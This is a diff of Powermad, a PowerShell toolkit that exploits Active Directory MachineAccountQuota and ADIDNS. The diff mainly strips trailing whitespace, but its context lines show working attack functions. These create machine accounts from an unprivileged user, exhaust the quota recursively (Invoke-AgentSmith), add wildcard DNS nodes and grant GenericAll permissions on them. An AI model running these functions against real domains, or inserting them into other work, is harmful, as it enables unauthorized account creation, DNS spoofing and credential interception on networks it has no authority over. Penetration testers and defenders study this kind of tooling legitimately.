@@ -1,7 +1,7 @@
 <#
 Powermad - PowerShell MachineAccountQuota and DNS exploit tools
-Author: Kevin Robertson (@kevin_robertson)  
-License: BSD 3-Clause 
+Author: Kevin Robertson (@kevin_robertson)
+License: BSD 3-Clause
 https://github.com/Kevin-Robertson/Powermad
 #>
 
@@ -14,9 +14,9 @@ function Disable-MachineAccount
     This function disables a machine account that was added through New-MachineAccount. This function should be
     used with the same user that created the machine account.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     Machine accounts added with New-MachineAccount cannot be deleted with an unprivileged user. Although users
     can remove systems from a domain that they added using ms-DS-MachineAccountQuota, the machine account in AD is
@@ -97,7 +97,7 @@ function Disable-MachineAccount
     }
     else
     {
-        $machine_account = $MachineAccount  
+        $machine_account = $MachineAccount
     }
 
     if(!$DistinguishedName)
@@ -112,7 +112,7 @@ function Disable-MachineAccount
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -129,7 +129,7 @@ function Disable-MachineAccount
     if(!$directory_entry.InvokeGet("AccountDisabled"))
     {
 
-        try 
+        try
         {
             $directory_entry.InvokeSet("AccountDisabled","True")
             $directory_entry.SetInfo()
@@ -150,7 +150,7 @@ function Disable-MachineAccount
     {
         $directory_entry.Close()
     }
-    
+
 }
 
 function Enable-MachineAccount
@@ -160,9 +160,9 @@ function Enable-MachineAccount
     This function enables a machine account that was disabled through Disable-MachineAccount. This function should
     be used with the same user that created the machine account.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function sets a machine account's AccountDisabled attribute to false.
 
@@ -240,7 +240,7 @@ function Enable-MachineAccount
     }
     else
     {
-        $machine_account = $MachineAccount  
+        $machine_account = $MachineAccount
     }
 
     if(!$DistinguishedName)
@@ -255,7 +255,7 @@ function Enable-MachineAccount
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -272,7 +272,7 @@ function Enable-MachineAccount
     if($directory_entry.InvokeGet("AccountDisabled"))
     {
 
-        try 
+        try
         {
             $directory_entry.InvokeSet("AccountDisabled","False")
             $directory_entry.SetInfo()
@@ -286,14 +286,14 @@ function Enable-MachineAccount
     }
     else
     {
-        Write-Output "[-] Machine account $MachineAccount is already enabled"   
+        Write-Output "[-] Machine account $MachineAccount is already enabled"
     }
 
     if($directory_entry.Path)
     {
         $directory_entry.Close()
     }
-    
+
 }
 
 function Get-MachineAccountAttribute
@@ -304,9 +304,9 @@ function Get-MachineAccountAttribute
 
     .DESCRIPTION
     This function is primarily for use with New-MachineAccount and Set-MachineAccountAttribute.
-    
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
+
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
 
     .PARAMETER Credential
     PSCredential object that will be used to read the attribute.
@@ -402,7 +402,7 @@ function Get-MachineAccountAttribute
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -445,9 +445,9 @@ function Get-MachineAccountCreator
     .DESCRIPTION
     This function can be used to see how close a user is to a ms-DS-MachineAccountQuota before
     using New-MachineAccount.
-    
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
+
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
 
     .PARAMETER Credential
     PSCredential object that will be used enumerate machine account creators.
@@ -525,7 +525,7 @@ function Get-MachineAccountCreator
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -541,15 +541,15 @@ function Get-MachineAccountCreator
         {
             $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
         }
-        
-        $machine_account_searcher = New-Object DirectoryServices.DirectorySearcher 
-        $machine_account_searcher.SearchRoot = $directory_entry  
+
+        $machine_account_searcher = New-Object DirectoryServices.DirectorySearcher
+        $machine_account_searcher.SearchRoot = $directory_entry
         $machine_account_searcher.PageSize = 1000
         $machine_account_searcher.Filter = '(&(ms-ds-creatorsid=*))'
         $machine_account_searcher.SearchScope = 'Subtree'
         $machine_accounts = $machine_account_searcher.FindAll()
         $creator_object_list = @()
-            
+
         ForEach($account in $machine_accounts)
         {
             $creator_SID_object = $account.properties."ms-ds-creatorsid"
@@ -566,11 +566,11 @@ function Get-MachineAccountCreator
                     {
                         $creator_account = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/<SID=$creator_SID>",$Credential.UserName,$credential.GetNetworkCredential().Password)
                         $creator_account_array = $($creator_account.distinguishedName).Split(",")
-                        $creator_username = $creator_account_array[($creator_account_array.Length - 2)].SubString(3).ToUpper() + "\" + $creator_account_array[0].SubString(3)    
+                        $creator_username = $creator_account_array[($creator_account_array.Length - 2)].SubString(3).ToUpper() + "\" + $creator_account_array[0].SubString(3)
                     }
                     else
                     {
-                        $creator_username = (New-Object System.Security.Principal.SecurityIdentifier($creator_SID)).Translate([System.Security.Principal.NTAccount]).Value                        
+                        $creator_username = (New-Object System.Security.Principal.SecurityIdentifier($creator_SID)).Translate([System.Security.Principal.NTAccount]).Value
                     }
 
                     Add-Member -InputObject $creator_object -MemberType NoteProperty -Name Creator $creator_username
@@ -579,7 +579,7 @@ function Get-MachineAccountCreator
                 {
                     Add-Member -InputObject $creator_object -MemberType NoteProperty -Name Creator $creator_SID
                 }
-                
+
                 Add-Member -InputObject $creator_object -MemberType NoteProperty -Name "Machine Account" $account.properties.name[0]
                 $creator_object_list += $creator_object
                 $creator_SID_object = $null
@@ -617,9 +617,9 @@ function Invoke-AgentSmith
     .DESCRIPTION
     This function leverages New-MachineAccount to recursively create as as many machine accounts as possible
     from a single unprivileged account through MachineAccountQuota.
-    
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
+
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
 
     .PARAMETER Credential
     PSCredential object that will be used enumerate machine account creators.
@@ -643,7 +643,7 @@ function Invoke-AgentSmith
 
     .PARAMETER MachineAccountQuota
     The domain's MachineAccountQuota setting.
-    
+
     .PARAMETER NoWarning
     Switch to remove the warning prompt.
 
@@ -662,7 +662,7 @@ function Invoke-AgentSmith
 
     [CmdletBinding()]
     param
-    ( 
+    (
         [parameter(Mandatory=$false)][String]$DistinguishedName,
         [parameter(Mandatory=$false)][String]$Domain,
         [parameter(Mandatory=$false)][String]$DomainController,
@@ -712,7 +712,7 @@ function Invoke-AgentSmith
         :main_loop while($i -le $MachineAccountQuota)
         {
             $MachineAccount = $MachineAccountPrefix + $j
-            
+
             try
             {
                 $output = New-MachineAccount -MachineAccount $MachineAccount -Credential $Credential -Password $Password -Domain $Domain -DomainController $DomainController -DistinguishedName $DistinguishedName
@@ -724,8 +724,8 @@ function Invoke-AgentSmith
                     $j--
                 }
                 else
-                {   
-                    Write-Output $output  
+                {
+                    Write-Output $output
                     $success = $j
                 }
 
@@ -735,12 +735,12 @@ function Invoke-AgentSmith
 
                 if($_.Exception.Message -like "*The supplied credential is invalid*")
                 {
-                    
+
                     if($j -gt $success)
                     {
                         Write-Output "[-] Machine account $account was not added"
                         Write-Output "[-] No remaining machine accounts to try"
-                        Write-Output "[+] Total machine accounts added = $($j - 1)"         
+                        Write-Output "[+] Total machine accounts added = $($j - 1)"
                         break main_loop
                     }
 
@@ -749,7 +749,7 @@ function Invoke-AgentSmith
                 }
                 else
                 {
-                    Write-Output "[-] $($_.Exception.Message)"    
+                    Write-Output "[-] $($_.Exception.Message)"
                 }
 
             }
@@ -792,9 +792,9 @@ function New-MachineAccount
     This function adds a machine account with a specified password to Active Directory through an encrypted LDAP
     add request. By default standard domain users can add up to 10 systems to AD (see ms-DS-MachineAccountQuota).
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     The main purpose of this function is to leverage the default ms-DS-MachineAccountQuota attribute setting which
     allows all domain users to add up to 10 computers to a domain. The machine account and HOST SPNs are added
@@ -891,7 +891,7 @@ function New-MachineAccount
         $Domain = $current_domain.Name
         Write-Verbose "[+] Domain = $Domain"
     }
-    
+
     $Domain = $Domain.ToLower()
     $machine_account = $MachineAccount
 
@@ -900,12 +900,12 @@ function New-MachineAccount
         $sam_account = $machine_account
         $machine_account = $machine_account.SubString(0,$machine_account.Length - 1)
     }
-    else 
+    else
     {
         $sam_account = $machine_account + "$"
     }
 
-    Write-Verbose "[+] SAMAccountName = $sam_account" 
+    Write-Verbose "[+] SAMAccountName = $sam_account"
 
     if(!$DistinguishedName)
     {
@@ -919,7 +919,7 @@ function New-MachineAccount
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -935,7 +935,7 @@ function New-MachineAccount
     {
         $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
     }
-    
+
     $connection.SessionOptions.Sealing = $true
     $connection.SessionOptions.Signing = $true
     $connection.Bind()
@@ -979,9 +979,9 @@ function Remove-MachineAccount
     .SYNOPSIS
     This function removes a machine account with a privileged account.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     Machine accounts added with MachineAccountQuote cannot be deleted with an unprivileged user. Although users
     can remove systems from a domain that they added using ms-DS-MachineAccountQuota, the machine account in AD is
@@ -1062,7 +1062,7 @@ function Remove-MachineAccount
     }
     else
     {
-        $machine_account = $MachineAccount  
+        $machine_account = $MachineAccount
     }
 
     if(!$DistinguishedName)
@@ -1077,7 +1077,7 @@ function Remove-MachineAccount
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -1223,7 +1223,7 @@ function Set-MachineAccountAttribute
     }
     else
     {
-        $machine_account = $MachineAccount  
+        $machine_account = $MachineAccount
     }
 
     if(!$DistinguishedName)
@@ -1238,7 +1238,7 @@ function Set-MachineAccountAttribute
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -1290,9 +1290,9 @@ function Disable-ADIDNSNode
     .SYNOPSIS
     This function can tombstone an ADIDNS node.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function deletes a DNS record by setting an ADIDNS node's dnsTombstoned attribute to 'True' and the
     dnsRecord attribute to a zero type array. Note that the node remains in AD.
@@ -1326,7 +1326,7 @@ function Disable-ADIDNSNode
     .EXAMPLE
     Tombstone a wildcard record.
     Disable-ADIDNSNode -Node *
-    
+
     .LINK
     https://github.com/Kevin-Robertson/Powermad
     #>
@@ -1405,7 +1405,7 @@ function Disable-ADIDNSNode
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
         }
-        
+
         $DC_array = $Domain.Split(".")
 
         ForEach($DC in $DC_array)
@@ -1415,7 +1415,7 @@ function Disable-ADIDNSNode
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -1465,12 +1465,12 @@ function Enable-ADIDNSNode
     .SYNOPSIS
     This function can turn a tombstoned node back into a valid record.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can turn a tombstoned node back into a valid record. This function should be used in place of
-    New-ADIDNSNode when working with nodes that already exist due to being previously added. 
+    New-ADIDNSNode when working with nodes that already exist due to being previously added.
 
     .PARAMETER Attribute
     The ADIDNS node attribute.
@@ -1544,7 +1544,7 @@ function Enable-ADIDNSNode
     [CmdletBinding()]
     param
     (
-        [parameter(Mandatory=$false)][String]$Data,    
+        [parameter(Mandatory=$false)][String]$Data,
         [parameter(Mandatory=$false)][String]$DistinguishedName,
         [parameter(Mandatory=$false)][String]$Domain,
         [parameter(Mandatory=$false)][String]$DomainController,
@@ -1606,7 +1606,7 @@ function Enable-ADIDNSNode
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -1625,7 +1625,7 @@ function Enable-ADIDNSNode
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -1633,7 +1633,7 @@ function Enable-ADIDNSNode
     if(!$DNSRecord)
     {
 
-        try 
+        try
         {
 
             if($Static)
@@ -1642,7 +1642,7 @@ function Enable-ADIDNSNode
             }
             else
             {
-                $DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Port $Port -Preference $Preference -Priority $Priority -SOASerialNumber $SOASerialNumber -TTL $TTL -Type $Type -Weight $Weight -Zone $Zone 
+                $DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Port $Port -Preference $Preference -Priority $Priority -SOASerialNumber $SOASerialNumber -TTL $TTL -Type $Type -Weight $Weight -Zone $Zone
             }
 
             Write-Verbose "[+] DNSRecord = $([System.Bitconverter]::ToString($DNSRecord))"
@@ -1650,7 +1650,7 @@ function Enable-ADIDNSNode
         catch
         {
             Write-Output "[-] $($_.Exception.Message)"
-            throw    
+            throw
         }
 
     }
@@ -1688,9 +1688,9 @@ function Get-ADIDNSNodeAttribute
     .SYNOPSIS
     This function can return values populated in an ADIDNS node attribute.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can be used to retrn an ADIDNS node attribute such as a dnsRecord array.
 
@@ -1782,7 +1782,7 @@ function Get-ADIDNSNodeAttribute
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -1801,7 +1801,7 @@ function Get-ADIDNSNodeAttribute
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -1838,9 +1838,9 @@ function Get-ADIDNSNodeOwner
     .SYNOPSIS
     This function can returns the owner of an ADIDNS Node.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can returns the owner of an ADIDNS Node.
 
@@ -1931,7 +1931,7 @@ function Get-ADIDNSNodeOwner
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -1950,7 +1950,7 @@ function Get-ADIDNSNodeOwner
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -1987,9 +1987,9 @@ function Get-ADIDNSNodeTombstoned
     .SYNOPSIS
     This function can determine if a node has been tombstoned.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function checks the values of dnsTombstoned and dnsRecord in order to determine if a node if currently
     tombstoned.
@@ -2022,7 +2022,7 @@ function Get-ADIDNSNodeTombstoned
     .EXAMPLE
     Get the dnsRecord attribute value of a node named test.
     Get-ADIDNSNodeAttribute -Node test -Attribute dnsRecord
-    
+
     .LINK
     https://github.com/Kevin-Robertson/Powermad
     #>
@@ -2081,7 +2081,7 @@ function Get-ADIDNSNodeTombstoned
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -2100,7 +2100,7 @@ function Get-ADIDNSNodeTombstoned
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -2163,9 +2163,9 @@ function Get-ADIDNSPermission
     .SYNOPSIS
     This function gets a DACL of an ADIDNS node or zone.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can be used to confirm that a user or group has the required permission
     to modify an ADIDNS zone or node.
@@ -2295,7 +2295,7 @@ function Get-ADIDNSPermission
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -2314,7 +2314,7 @@ function Get-ADIDNSPermission
         $directory_entry_security = $directory_entry.psbase.ObjectSecurity
         $directory_entry_DACL = $directory_entry_security.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier])
         $output=@()
-        
+
         ForEach($ACE in $directory_entry_DACL)
         {
             $principal = ""
@@ -2326,7 +2326,7 @@ function Get-ADIDNSPermission
             }
             catch
             {
-             
+
                 if($ACE.IdentityReference.AccountDomainSid)
                 {
 
@@ -2357,7 +2357,7 @@ function Get-ADIDNSPermission
                 }
 
             }
-            
+
             $PS_object = New-Object PSObject
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "Principal" $principal
 
@@ -2372,7 +2372,7 @@ function Get-ADIDNSPermission
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "ObjectType" $ACE.ObjectType
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "InheritedObjectType" $ACE.InheritedObjectType
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "ObjectFlags" $ACE.ObjectFlags
-            Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "AccessControlType" $ACE.AccessControlType 
+            Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "AccessControlType" $ACE.AccessControlType
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "IsInherited" $ACE.IsInherited
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "InheritanceFlags" $ACE.InheritanceFlags
             Add-Member -InputObject $PS_object -MemberType NoteProperty -Name "PropagationFlags" $ACE.PropagationFlags
@@ -2404,9 +2404,9 @@ function Get-ADIDNSZone
     .SYNOPSIS
     This function can return ADIDNS zones.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can return ADIDNS zones. The output format is a distinguished name. The distinguished name will
     contain a partition value of either DomainDNSZones,ForestDNSZones, or System. The correct value can be inputed
@@ -2546,7 +2546,7 @@ function Get-ADIDNSZone
         try
         {
             $directory_searcher = New-Object System.DirectoryServices.DirectorySearcher($directory_entry)
-            
+
             if($Zone)
             {
                 $directory_searcher.filter = "(&(objectClass=dnszone)(name=$Zone))"
@@ -2585,9 +2585,9 @@ function Grant-ADIDNSPermission
     .SYNOPSIS
     This function adds an ACE to an ADIDNS node or zone DACL.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     Users that create a new DNS node through LDAP or secure dynamic updates will have full
     control access. This function can be used to provide additional accounts or groups access to the node.
@@ -2641,7 +2641,7 @@ function Grant-ADIDNSPermission
         [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
         "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
         "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$Access = "GenericAll",
-        [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
+        [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",
         [parameter(Mandatory=$false)][String]$DistinguishedName,
         [parameter(Mandatory=$false)][String]$Domain,
         [parameter(Mandatory=$false)][String]$DomainController,
@@ -2731,7 +2731,7 @@ function Grant-ADIDNSPermission
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = $DistinguishedName
     }
@@ -2796,9 +2796,9 @@ function New-ADIDNSNode
     This function adds a DNS node to an Active Directory-Integrated DNS (ADIDNS) Zone through an encrypted LDAP
     add request.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function creates an ADIDNS record by connecting to LDAP and adding an object of type dnsNode.
 
@@ -2950,7 +2950,7 @@ function New-ADIDNSNode
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -2969,7 +2969,7 @@ function New-ADIDNSNode
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -2977,7 +2977,7 @@ function New-ADIDNSNode
     if(!$DNSRecord)
     {
 
-        try 
+        try
         {
 
             if($Static)
@@ -2986,15 +2986,15 @@ function New-ADIDNSNode
             }
             else
             {
-                $DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Port $Port -Preference $Preference -Priority $Priority -SOASerialNumber $SOASerialNumber -TTL $TTL -Type $Type -Weight $Weight -Zone $Zone 
+                $DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Port $Port -Preference $Preference -Priority $Priority -SOASerialNumber $SOASerialNumber -TTL $TTL -Type $Type -Weight $Weight -Zone $Zone
             }
-            
+
             Write-Verbose "[+] DNSRecord = $([System.Bitconverter]::ToString($DNSRecord))"
         }
         catch
         {
             Write-Output "[-] $($_.Exception.Message)"
-            throw    
+            throw
         }
 
     }
@@ -3017,7 +3017,7 @@ function New-ADIDNSNode
     {
         $object_category += ",DC=$DC"
     }
-    
+
     try
     {
         $connection.SessionOptions.Sealing = $true
@@ -3033,7 +3033,7 @@ function New-ADIDNSNode
         {
             $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
         }
-        
+
         $connection.SendRequest($request) > $null
         Write-Output "[+] ADIDNS node $Node added"
     }
@@ -3048,12 +3048,12 @@ function New-SOASerialNumberArray
 {
     <#
     .SYNOPSIS
-    This function gets the current SOA serial number for a DNS zone and increments it by the 
+    This function gets the current SOA serial number for a DNS zone and increments it by the
     set amount.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can be used to create a byte array which contains the correct SOA serial number for the
     next record that will be created with New-DNSRecordArray.
@@ -3226,7 +3226,7 @@ function New-SOASerialNumberArray
             $packet_DNSQuery = New-PacketDNSSOAQuery $Zone
             [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery
             $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null
-            $DNS_client_stream.Flush()   
+            $DNS_client_stream.Flush()
             $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null
             $DNS_client.Close()
             $DNS_client_stream.Close()
@@ -3423,7 +3423,7 @@ function New-DNSRecordArray
             [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes(($Data -replace ":","").Length / 2))[0..1]
             [Byte[]]$DNS_data += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()
         }
-        
+
         'CNAME'
         {
             [Byte[]]$DNS_type = 0x05,0x00
@@ -3443,7 +3443,7 @@ function New-DNSRecordArray
             $DNS_data += New-DNSNameArray $Data
             $DNS_data += 0x00
         }
-        
+
         'MX'
         {
             [Byte[]]$DNS_type = 0x0f,0x00
@@ -3497,7 +3497,7 @@ function New-DNSRecordArray
         }
 
     }
-    
+
     [Byte[]]$DNS_TTL = [System.BitConverter]::GetBytes($TTL)
     [Byte[]]$DNS_record = $DNS_length +
         $DNS_type +
@@ -3518,7 +3518,7 @@ function New-DNSRecordArray
         $timestamp = $timestamp[0..3]
         $DNS_record += $timestamp
     }
-    
+
     $DNS_record += $DNS_data
 
     return ,$DNS_record
@@ -3530,9 +3530,9 @@ function Rename-ADIDNSNode
     .SYNOPSIS
     This function renames an ADIDNS node.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can be used to rename an ADIDNS node. Note that renaming the ADIDNS node will leave the old
     record within DNS.
@@ -3625,7 +3625,7 @@ function Rename-ADIDNSNode
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -3644,9 +3644,9 @@ function Rename-ADIDNSNode
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
-        $distinguished_name = $DistinguishedName 
+        $distinguished_name = $DistinguishedName
     }
 
     if($Credential)
@@ -3681,9 +3681,9 @@ function Remove-ADIDNSNode
     .SYNOPSIS
     This function removes an ADIDNS node.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can be used to remove an ADIDNS node. Note that the if the node has not been tombstoned and
     allowed to repliate to all domain controllers, the record will remain in DNS.
@@ -3772,7 +3772,7 @@ function Remove-ADIDNSNode
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -3791,9 +3791,9 @@ function Remove-ADIDNSNode
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
-        $distinguished_name = $DistinguishedName 
+        $distinguished_name = $DistinguishedName
     }
 
     if($Credential)
@@ -3828,9 +3828,9 @@ function Revoke-ADIDNSPermission
     .SYNOPSIS
     This function removes an ACE to an ADIDNS node or zone DACL.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function is mainly for removing the ACE associated with the user that created the DNS node
     after adding an alternative ACE with Set-DNSPermission. Although this function will work on DNS zones,
@@ -3868,7 +3868,7 @@ function Revoke-ADIDNSPermission
 
     .PARAMETER Zone
     The ADIDNS zone.
-    
+
     .EXAMPLE
     Remove the GenericAll ACE associated for the user1 account.
     Revoke-ADIDNSPermission -Node * -Principal user1 -Access GenericAll
@@ -3883,7 +3883,7 @@ function Revoke-ADIDNSPermission
         [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
         "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
         "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$Access = "GenericAll",
-        [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
+        [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",
         [parameter(Mandatory=$false)][String]$DistinguishedName,
         [parameter(Mandatory=$false)][String]$Domain,
         [parameter(Mandatory=$false)][String]$DomainController,
@@ -3973,9 +3973,9 @@ function Revoke-ADIDNSPermission
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
-        $distinguished_name = $DistinguishedName 
+        $distinguished_name = $DistinguishedName
     }
 
     if($Credential)
@@ -4028,9 +4028,9 @@ function Set-ADIDNSNodeAttribute
     .SYNOPSIS
     This function can append, populate, or overwite values in an ADIDNS node attribute.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can append, populate, or overwite values in an ADIDNS node attribute.
 
@@ -4131,7 +4131,7 @@ function Set-ADIDNSNodeAttribute
 
     if(!$DistinguishedName)
     {
-        
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -4150,7 +4150,7 @@ function Set-ADIDNSNodeAttribute
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
